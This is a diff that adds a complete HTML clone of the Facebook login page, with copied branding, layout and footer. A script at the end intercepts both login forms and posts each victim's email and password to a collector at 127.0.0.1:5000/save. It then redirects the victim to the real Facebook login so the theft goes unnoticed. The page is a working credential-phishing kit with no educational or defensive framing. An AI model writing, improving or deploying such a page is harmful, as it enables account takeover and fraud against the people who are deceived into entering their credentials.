@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
+<style>
+    /* Global Styles */
+    body {
+        margin: 0;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #f0f2f5;
+        color: #1c1e21;
+    }
+
+    a {
+        text-decoration: none;
+        color: #1877f2;
+    }
+
+    /* Top Section */
+    .top-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 40px;
+        background-color: #fff;
+        border-bottom: 1px solid #ddd;
+    }
+
+    .top-bar img {
+        height: 40px;
+    }
+
+    .top-bar .login-form {
+        display: flex;
+        align-items: center;
+    }
+
+    .top-bar .login-form input {
+        padding: 8px 10px;
+        margin-left: 5px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 14px;
+    }
+
+    .top-bar .login-form button {
+        margin-left: 5px;
+        padding: 8px 16px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 14px;
+    }
+
+    .top-bar .login-form button:hover {
+        background-color: #165ecc;
+    }
+
+    /* Main Section */
+    .main-container {
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding: 60px 20px;
+        flex-wrap: wrap;
+        max-width: 1000px;
+        margin: 0 auto;
+    }
+
+    .left-section {
+        flex: 1 1 400px;
+        padding-right: 50px;
+    }
+
+    .left-section h1 {
+        font-size: 50px;
+        color: #1877f2;
+        margin-bottom: 20px;
+    }
+
+    .left-section p {
+        font-size: 22px;
+        line-height: 28px;
+    }
+
+    .right-section {
+        flex: 1 1 350px;
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        text-align: center;
+    }
+
+    .right-section input[type="text"],
+    .right-section input[type="password"] {
+        width: 100%;
+        padding: 14px;
+        margin: 6px 0;
+        border-radius: 6px;
+        border: 1px solid #ddd;
+        font-size: 16px;
+    }
+
+    .right-section button.login-btn {
+        width: 100%;
+        padding: 14px;
+        margin-top: 12px;
+        border: none;
+        border-radius: 6px;
+        font-size: 18px;
+        font-weight: bold;
+        background-color: #1877f2;
+        color: white;
+        cursor: pointer;
+    }
+
+    .right-section button.login-btn:hover {
+        background-color: #165ecc;
+    }
+
+    .right-section .forgot-link {
+        display: block;
+        margin: 12px 0;
+        font-size: 14px;
+    }
+
+    .separator {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        margin: 12px 0;
+    }
+
+    .separator::before, .separator::after {
+        content: '';
+        flex: 1;
+        border-bottom: 1px solid #ccc;
+    }
+
+    .separator:not(:empty)::before {
+        margin-right: .5em;
+    }
+
+    .separator:not(:empty)::after {
+        margin-left: .5em;
+    }
+
+    .create-btn {
+        background-color: #42b72a;
+        color: white;
+        font-weight: bold;
+        padding: 14px;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+
+    .create-btn:hover {
+        background-color: #36a420;
+    }
+
+    /* Footer */
+    footer {
+        text-align: center;
+        margin-top: 50px;
+        color: #65676b;
+        font-size: 12px;
+    }
+
+    footer a {
+        margin: 0 6px;
+        color: #65676b;
+    }
+
+    @media (max-width: 768px) {
+        .main-container {
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .left-section {
+            text-align: center;
+            padding-right: 0;
+            margin-bottom: 20px;
+        }
+    }
+</style>
+</head>
+<body>
+
+<!-- Top login bar -->
+<div class="top-bar">
+    <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
+    <form class="login-form" id="topLoginForm">
+        <input type="text" placeholder="Email or Phone" required>
+        <input type="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+<!-- Main section -->
+<div class="main-container">
+    <div class="left-section">
+        <h1>Facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <div class="right-section">
+        <form id="loginForm">
+            <input type="text" placeholder="Email or phone number" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#" class="forgot-link">Forgotten password?</a>
+        <div class="separator">or</div>
+        <button class="create-btn">Create New Account</button>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer>
+    <p>
+        <a href="#">English (UK)</a> ·
+        <a href="#">Español</a> ·
+        <a href="#">Français (France)</a> ·
+        <a href="#">Deutsch</a> ·
+        <a href="#">More</a>
+    </p>
+    <p>Facebook © 2025</p>
+</footer>
+
+<script>
+// Function to send form data to local server.py and then redirect
+async function sendAndRedirect(form) {
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = this.querySelector('input[type="text"]').value;
+        const password = this.querySelector('input[type="password"]').value;
+
+        // Save credentials locally
+        await fetch('http://127.0.0.1:5000/save', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({username: email, password: password})
+        });
+
+        // Redirect to real Facebook login page
+        window.location.href = 'https://www.facebook.com/login';
+    });
+}
+
+// Attach function to both forms
+sendAndRedirect(document.getElementById('loginForm'));
+sendAndRedirect(document.getElementById('topLoginForm'));
+</script>
+
+</body>
+</html>
